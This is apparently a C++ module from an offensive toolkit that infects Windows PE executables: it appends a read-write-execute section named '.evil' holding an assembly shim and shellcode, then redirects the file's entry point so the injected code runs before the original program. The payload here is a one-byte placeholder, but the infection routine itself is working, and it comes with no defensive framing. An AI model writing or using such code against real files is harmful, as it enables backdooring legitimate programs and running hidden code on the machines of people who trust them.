#include "../core/external.h"
#include "../common/pe_structs.h"

// TODO: I need to implent dll repacking

extern "C" void shim_end();

extern "C" __attribute__ ((__optimize__("no-align-functions", "omit-frame-pointer"))) void shim()
{
    __asm__ __volatile__(
        "lea    -0x07(%%rip), %%rax;"
        "pushq  %%rcx;"
        "movq   $0xDEADBEEFDEADBEEF, %%rcx;"
        "movq   %%rax, %%rbx;"
        "subq   %%rcx, %%rax;"
        "popq   %%rcx;"
        "pushq  %%rax;"
        "pushq  %%rcx;"
        "pushq  %%rdx;"
        "pushq  %%r8;"
        "pushq  %%r9;"
        "call   shim_end;"
        "popq   %%r9;"
        "popq   %%r8;"
        "popq   %%rdx;"
        "popq   %%rcx;"
        "popq   %%rax;"
        "jmpq  *%%rax;"
        "retq;"
        ".global shim_end;"
        "shim_end:;"
        "nop;"
        :
        :
        :
    );
}

// NOTE: this method requires the dll to in rwx memory
void patch_shim(uint32_t old_entry, uint32_t new_entry)
{
    *(uint64_t *)((uint8_t *)&shim + 10) = new_entry - old_entry;
}

#define shim_size   ((uint32_t)((uint64_t)&shim_end - (uint64_t)&shim))

namespace patch_stuff
{

static void *what;
static size_t size;

size_t set(const void *sc, size_t sz)
{
    if(NULL == (what = HeapAlloc(GetProcessHeap(), 0, sz + shim_size)))
        return 0;
    
    memcpy((uint8_t *)what + shim_size, sc, sz);
    
    size = sz + shim_size;
    return size;
}

void unset()
{
    HeapFree(GetProcessHeap(), 0, what);
}

void write(HANDLE hFile, struct section_header *sh)
{
    DWORD num;

    memcpy(what, (void *)&shim, shim_size);

    WriteFile(hFile, what, size, &num, NULL);
    sc_printf("shim + shellcode write was %x bytes\n", num);
    void *pad = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sh->size_of_raw - size);
    WriteFile(hFile, pad, sh->size_of_raw - size, &num, NULL);
    HeapFree(GetProcessHeap(), 0, pad);
}

}; //end namespace patch_stuff


inline LONG GetFilePointer(HANDLE hFile)
{
   return SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
}

extern "C" __declspec(dllexport) void patch(const char *arg)
{
    size_t size;
    HANDLE hFile;
    DWORD num;

    // open the file to patch in rw mode (note: this need exclusive privs to the file)
    // TODO: switch to using file locks
    if(INVALID_HANDLE_VALUE == (hFile = CreateFile(arg,
                                                   GENERIC_READ | GENERIC_WRITE | FILE_APPEND_DATA,
                                                   0,
                                                   NULL,
                                                   OPEN_EXISTING,
                                                   FILE_ATTRIBUTE_NORMAL,
                                                   NULL
                                                   ))){
        sc_printf("unable to open %s\n", arg);
        return;
    }

    // TODO: check to make sure the file is indeed an executable (using GetBinaryType) (we also can patch dlls though)

    // allocate memmory on the heap for the new thing
    // NOTE: what we allocate here goes to disk anyways, so who cares if it cached
    const char *sc = "\xC3";
    size_t sc_sz = 1;
    
    if(!(size = patch_stuff::set(sc, sc_sz))){
        sc_printf("unable to allocate memory\n");
        return;
    }
    
    struct dos_header dh;

    ReadFile(hFile, &dh, sizeof(struct dos_header), &num, NULL);
    SetFilePointer(hFile, (LONG)dh.e_lfanew, NULL, FILE_BEGIN);

    struct nt_header nh;
    ReadFile(hFile, &nh, sizeof(struct nt_header), &num, NULL);
    
    // we need an extra one for the one we plan to create
    struct section_header sections[nh.FileHeader.NumberOfSections + 2];
    ZeroMemory(sections, (nh.FileHeader.NumberOfSections + 1) * sizeof(struct section_header));

    SetFilePointer(hFile, (LONG)(dh.e_lfanew + 4 + sizeof(struct file_header) + nh.FileHeader.SizeOfOptionalHeader), NULL, FILE_BEGIN);
    ReadFile(hFile, sections, nh.FileHeader.NumberOfSections * sizeof(struct section_header), &num, NULL);
    
    // check we have room for the section header
    if(GetFilePointer(hFile) + 2 * sizeof(struct section_header) > nh.OptionalHeader.SizeOfHeaders){
        // TODO: implement this (in reality this is almost never needed)
        
        sc_printf("unalble to patch executable: no room for new section header\n");
        patch_stuff::unset();
        CloseHandle(hFile);
    }

    num = SetFilePointer(hFile, 0, NULL, FILE_END);

    // create the section header
    strcpy(sections[nh.FileHeader.NumberOfSections].name, ".evil");
    
    sections[nh.FileHeader.NumberOfSections].size = size;
    sections[nh.FileHeader.NumberOfSections].addr = sections[nh.FileHeader.NumberOfSections - 1].addr + 
                                                    round_up(sections[nh.FileHeader.NumberOfSections - 1].size, nh.OptionalHeader.SectionAlignment);
    sections[nh.FileHeader.NumberOfSections].size_of_raw = round_up(size, nh.OptionalHeader.FileAlignment);
    sections[nh.FileHeader.NumberOfSections].pointer_to_raw = num;
    sections[nh.FileHeader.NumberOfSections].charecteristics = 0xE0000020;
    
    // write the section
    patch_shim(nh.OptionalHeader.AddressOfEntryPoint, sections[nh.FileHeader.NumberOfSections].addr);
    patch_stuff::write(hFile, sections + nh.FileHeader.NumberOfSections);
    
    // write the section header
    SetFilePointer(hFile, (LONG)(dh.e_lfanew + 4 + sizeof(struct file_header) + nh.FileHeader.SizeOfOptionalHeader)
                   + nh.FileHeader.NumberOfSections * sizeof(struct section_header), NULL, FILE_BEGIN);
    WriteFile(hFile, sections + nh.FileHeader.NumberOfSections, 2 * sizeof(struct section_header), &num, NULL);
    
    // modifiy the nt header
    nh.OptionalHeader.AddressOfEntryPoint = sections[nh.FileHeader.NumberOfSections].addr;
    nh.FileHeader.NumberOfSections++;
    nh.OptionalHeader.SizeOfImage += round_up(sections[nh.FileHeader.NumberOfSections - 1].size, nh.OptionalHeader.SectionAlignment);
    
    // write the modified nt header
    SetFilePointer(hFile, (LONG)dh.e_lfanew, NULL, FILE_BEGIN);
    WriteFile(hFile, &nh, sizeof(struct nt_header), &num, NULL);

    patch_stuff::unset();
    CloseHandle(hFile);
}
